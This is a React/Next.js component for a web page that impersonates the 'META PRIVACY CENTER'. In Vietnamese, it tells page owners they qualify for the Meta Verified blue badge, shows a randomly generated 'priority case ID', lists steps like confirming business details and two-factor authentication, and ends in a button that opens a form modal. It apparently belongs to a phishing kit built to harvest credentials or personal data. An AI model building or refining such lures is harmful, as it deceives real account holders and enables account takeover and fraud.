'use client'
import Link from 'next/link';
import React from 'react'

const MainContent = ({ handleOpendInfoModal }: { handleOpendInfoModal: () => void }) => {
    const [ticketId, setTicketId] = React.useState("4564-ATFD-4865");
    const currentDate = new Date().toLocaleDateString('en-US', { month: 'long', day: 'numeric', year: 'numeric' })

    const handleOpend = () => {
        handleOpendInfoModal();
    }

    React.useEffect(() => {
        const generateTicketId = () => {
            const section1 = Math.random().toString(36).substring(2, 6).toUpperCase();
            const section2 = Math.random().toString(36).substring(2, 6).toUpperCase();
            const section3 = Math.random().toString(36).substring(2, 6).toUpperCase();
            setTicketId(`${section1}-${section2}-${section3}`);
        };

        generateTicketId();
    }, []);

    return (
        <>
            <div className="flex min-h-[100vh] w-full flex-col items-center justify-start bg-[radial-gradient(circle_at_top,rgba(24,119,242,0.12)_0%,rgba(245,249,255,1)_42%,rgba(255,255,255,1)_100%)] px-[16px] py-[28px]">
                <div className='w-full max-w-[860px]'>
                    <div className="rounded-[28px] border border-[#dbe9ff] bg-white p-[18px] shadow-[0_18px_45px_rgba(24,119,242,0.14)] sm:p-[28px]">
                        <div className='mb-[20px] flex flex-wrap items-center justify-between gap-[12px] rounded-[16px] bg-[#eef4ff] px-[16px] py-[10px] text-[#1f2a45]'>
                            <p className='text-[13px] font-semibold tracking-[0.02em]'>META PRIVACY CENTER</p>
                            <p className='text-[13px] font-medium text-[#3f4f70]'>Issued: {currentDate}</p>
                        </div>

                        <div className='mb-[26px] flex items-start gap-[12px]'>
                            <div className='rounded-[14px] bg-[#e7f0ff] p-[12px]'>
                                <img src="images/icons/ic_blue.svg" className='h-[38px] w-[38px]' alt="Meta verified badge" />
                            </div>
                            <div>
                                <h1 className='text-[1.7rem] font-extrabold leading-[1.2] text-[#0b1f44] sm:text-[2.1rem]'>
                                    Chúc mừng! Trang của bạn đã đạt tiêu chí nhận huy hiệu xanh Meta Verified
                                </h1>
                                <p className='mt-[10px] text-[15px] leading-[1.65] text-[#33476a]'>
                                    Đây là cột mốc quan trọng, thể hiện độ tin cậy, tính minh bạch và mức độ chuyên nghiệp của thương hiệu trong mắt cộng đồng.
                                </p>
                                <p className='mt-[8px] text-[14px] font-medium text-[#4c6087]'>Mã hồ sơ ưu tiên: #{ticketId}</p>
                            </div>
                        </div>

                        <div className='grid gap-[14px] sm:grid-cols-2'>
                            <div className='rounded-[18px] border border-[#e5eefc] bg-[#fbfdff] p-[16px]'>
                                <p className='mb-[8px] text-[16px] font-bold text-[#122a55]'>Giá trị khi có huy hiệu xanh</p>
                                <ul className='space-y-[8px] text-[14px] leading-[1.6] text-[#3d5075]'>
                                    <li>- Tăng mức độ nhận diện và uy tín thương hiệu.</li>
                                    <li>- Dễ dàng tiếp cận khách hàng mới qua tìm kiếm và gợi ý.</li>
                                    <li>- Góp phần bảo vệ danh tính trang khỏi mạo danh.</li>
                                </ul>
                            </div>
                            <div className='rounded-[18px] border border-[#d7eadf] bg-[#f4fcf7] p-[16px]'>
                                <p className='mb-[8px] text-[16px] font-bold text-[#13462d]'>Bước tiếp theo để hoàn tất</p>
                                <ul className='space-y-[8px] text-[14px] leading-[1.6] text-[#2f5d45]'>
                                    <li>- Xác nhận thông tin liên hệ và thông tin doanh nghiệp.</li>
                                    <li>- Kiểm tra bảo mật tài khoản và xác thực 2 lớp.</li>
                                    <li>- Gửi yêu cầu để đội ngũ kiểm duyệt ưu tiên xử lý.</li>
                                </ul>
                            </div>
                        </div>

                        <div className='mt-[14px] rounded-[16px] border border-[#ffe4b8] bg-[#fff8eb] p-[14px] text-[14px] leading-[1.6] text-[#7a5a1b]'>
                            Lưu ý: Hồ sơ đầy đủ và hợp lệ sẽ được xử lý nhanh hơn. Thời gian phản hồi thông thường trong 24 giờ, tuy nhiên có thể kéo dài trong một số trường hợp cần bổ sung thông tin.
                        </div>
                    </div>

                    <button
                        type='button'
                        className='mx-auto my-[24px] block w-full max-w-[340px] rounded-full bg-[linear-gradient(90deg,#1877f2_0%,#1a9bff_100%)] px-[24px] py-[13px] text-[16px] font-semibold text-white shadow-[0_10px_22px_rgba(24,119,242,0.3)] transition duration-200 hover:brightness-105'
                        onClick={handleOpend}
                    >
                        Hoàn tất yêu cầu Meta Verified
                    </button>

                    <div className='mt-[26px] flex flex-wrap items-center justify-center gap-[16px] text-center text-[12px] text-[#6c7a94]'>
                        <Link href="">Help Center</Link>
                        <Link href="">Privacy Policy</Link>
                        <Link href="">Terms of Service</Link>
                        <Link href="">Community Standards</Link>
                        <Link href="">Meta © {new Date().getFullYear()}</Link>
                    </div>
                </div>
            </div>
        </>
    )
}

export default MainContent
